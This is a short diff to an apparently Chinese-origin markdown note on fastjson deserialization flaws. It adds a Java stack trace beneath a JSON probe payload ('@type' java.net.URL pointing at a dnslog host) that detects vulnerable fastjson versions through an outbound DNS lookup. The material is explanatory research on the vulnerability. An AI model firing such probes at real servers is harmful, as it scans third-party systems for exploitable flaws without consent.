@@ -45,6 +45,18 @@ fastjson >1.2.43
 
 ```java
 {{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
+
+hashCode:359, URLStreamHandler (java.net)
+hashCode:885, URL (java.net)
+hash:339, HashMap (java.util)
+put:612, HashMap (java.util)
+parseObject:491, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1401, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1367, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:183, JSON (com.alibaba.fastjson)
+parse:193, JSON (com.alibaba.fastjson)
+parse:149, JSON (com.alibaba.fastjson)
+main:8, test (org.chabug.fastjson.test)
 ```
 
 fastjson <1.2.48
